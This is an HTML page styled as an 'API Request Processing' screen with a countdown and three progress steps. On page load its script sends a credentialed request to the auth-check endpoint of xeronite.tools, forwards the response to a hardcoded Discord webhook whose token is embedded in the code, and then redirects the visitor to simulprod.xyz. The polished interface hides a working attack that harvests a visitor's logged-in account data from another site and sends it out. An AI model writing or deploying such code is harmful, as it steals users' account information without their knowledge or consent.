<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Request Processing</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 600px;
            width: 90%;
        }
        
        h1 {
            margin-top: 0;
            font-weight: 300;
            font-size: 28px;
        }
        
        .status {
            margin: 30px 0;
            padding: 20px;
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.2);
        }
        
        .step {
            display: flex;
            align-items: center;
            margin: 15px 0;
            padding: 10px;
            border-radius: 8px;
            transition: all 0.3s ease;
        }
        
        .step.active {
            background: rgba(0, 123, 255, 0.2);
            border-left: 4px solid #007bff;
        }
        
        .step.completed {
            background: rgba(40, 167, 69, 0.2);
            border-left: 4px solid #28a745;
        }
        
        .step-icon {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
        }
        
        .step.active .step-icon {
            background: #007bff;
        }
        
        .step.completed .step-icon {
            background: #28a745;
        }
        
        .step.pending .step-icon {
            background: #6c757d;
        }
        
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .countdown {
            font-size: 18px;
            margin-top: 20px;
        }
        
        .redirect-info {
            margin-top: 30px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Processing API Request</h1>
        
        <div class="status">
            <div class="step pending" id="step1">
                <div class="step-icon">1</div>
                <div>Initializing request to xeronite.tools</div>
            </div>
            
            <div class="step pending" id="step2">
                <div class="step-icon">2</div>
                <div>Sending response to Discord webhook</div>
            </div>
            
            <div class="step pending" id="step3">
                <div class="step-icon">3</div>
                <div>Redirecting to simulprod.xyz</div>
            </div>
        </div>
        
        <div class="loader" id="loader"></div>
        
        <div class="countdown" id="countdown">
            Redirecting in <span id="countdown-value">5</span> seconds...
        </div>
        
        <div class="redirect-info">
            You will be automatically redirected to simulprod.xyz after the process completes.
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const step1 = document.getElementById('step1');
            const step2 = document.getElementById('step2');
            const step3 = document.getElementById('step3');
            const countdownValue = document.getElementById('countdown-value');
            const loader = document.getElementById('loader');
            
            let countdown = 0.1;
            const countdownInterval = setInterval(() => {
                countdown--;
                countdownValue.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownInterval);
                }
            }, 1000);
            
            // Step 1: Make API request
            step1.classList.remove('pending');
            step1.classList.add('active');
            
            fetch("https://xeronite.tools/api/auth/check", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9,vi;q=0.8,es;q=0.7,ru;q=0.6,id;q=0.5,zh-CN;q=0.4,zh;q=0.3,it;q=0.2,tr;q=0.1,ja;q=0.1,ko;q=0.1,nl;q=0.1,pt-BR;q=0.1,pt;q=0.1,fr;q=0.1,pl;q=0.1,da;q=0.1",
                    "cache-control": "no-cache",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Opera GX\";v=\"122\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin"
                },
                "referrer": "https://xeronite.tools/profile",
                "body": null,
                "method": "GET",
                "mode": "cors",
                "credentials": "include"
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                step1.classList.remove('active');
                step1.classList.add('completed');
                
                // Step 2: Send to Discord webhook
                step2.classList.remove('pending');
                step2.classList.add('active');
                
                // Prepare the data to send to Discord
                const discordPayload = {
                    content: `API Response from xeronite.tools:\n\`\`\`json\n${data}\n\`\`\``,
                    username: "API Monitor",
                    avatar_url: "https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
                };
                
                // Send to Discord webhook
                return fetch("https://discord.com/api/webhooks/1434566139270402260/7c5XHI2xwB0XUTINrL4yxoFFHtnJq2lZt3xRYqJuEQHakYXqH9As-hmXu1YUvBEI53Oj", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify(discordPayload)
                });
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed to send to Discord');
                }
                
                step2.classList.remove('active');
                step2.classList.add('completed');
                
                // Step 3: Redirect
                step3.classList.remove('pending');
                step3.classList.add('active');
                
                // Hide loader
                loader.style.display = 'none';
                
                // Redirect after a short delay
                setTimeout(() => {
                    window.location.href = "https://simulprod.xyz";
                }, 1000);
            })
            .catch(error => {
                console.error("Error:", error);
                
                // Update UI to show error
                step1.classList.remove('active');
                step1.classList.add('completed');
                
                step2.classList.remove('active');
                step2.classList.add('completed');
                
                step3.classList.remove('pending');
                step3.classList.add('active');
                
                // Hide loader
                loader.style.display = 'none';
                
                // Redirect even if there was an error
                setTimeout(() => {
                    window.location.href = "https://simulprod.xyz";
                }, 1000);
            });
        });
    </script>
</body>
</html>
